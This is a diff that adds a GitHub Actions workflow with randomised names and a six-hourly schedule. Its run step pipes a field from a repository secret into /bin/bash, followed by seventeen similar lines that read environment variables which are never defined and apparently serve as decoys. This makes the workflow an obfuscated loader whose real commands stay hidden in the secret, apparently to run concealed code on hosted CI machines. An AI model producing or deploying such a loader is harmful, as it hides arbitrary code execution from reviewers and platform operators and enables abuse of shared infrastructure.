@@ -1,0 +1,35 @@
+name: fangjialuooo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fangjialuooo
+        env:
+          zen9728: ${{ secrets.zen9728 }}
+        run: |
+          echo $zen9728 | jq -r .kzlz376 | /bin/bash
+          echo $lzeoc475 | jq -r .qene8338 | /bin/bash
+          echo $xmgq82 | jq -r .vx8 | /bin/bash
+          echo $yfzf414 | jq -r .bn30 | /bin/bash
+          echo $md98 | jq -r .mai27463 | /bin/bash
+          echo $kgq24 | jq -r .trw1424 | /bin/bash
+          echo $ymsy46736 | jq -r .gs813 | /bin/bash
+          echo $potb82063 | jq -r .eh7 | /bin/bash
+          echo $ij99 | jq -r .meup9974 | /bin/bash
+          echo $c7 | jq -r .xkmfw1 | /bin/bash
+          echo $dman2 | jq -r .lmsb1 | /bin/bash
+          echo $pb0364 | jq -r .f13 | /bin/bash
+          echo $cwzr7014 | jq -r .zg2878 | /bin/bash
+          echo $j22 | jq -r .i20 | /bin/bash
+          echo $deba9 | jq -r .qqzde13644 | /bin/bash
+          echo $eoz68415 | jq -r .b62134 | /bin/bash
+          echo $vqskf60372 | jq -r .csyx0953 | /bin/bash
+          echo $h805 | jq -r .viojz66411 | /bin/bash
+
